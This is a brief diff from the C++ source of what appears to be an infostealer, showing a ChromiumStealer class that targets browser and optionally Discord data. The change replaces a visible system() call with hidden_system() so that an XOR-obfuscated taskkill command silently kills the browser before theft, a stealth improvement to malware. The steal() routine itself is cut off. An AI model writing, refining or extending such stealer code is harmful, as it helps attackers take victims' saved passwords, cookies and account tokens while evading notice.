@@ -10,7 +10,7 @@
 
 class ChromiumStealer : public AbstractStealer {
 public:
-  ChromiumStealer(std::string executable, std::filesystem::path path, bool discord = false) : path(path), discord(discord) { system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }
+  ChromiumStealer(std::string executable, std::filesystem::path path, bool discord = false) : path(path), discord(discord) { hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }
 
   inline void steal() override {
     {
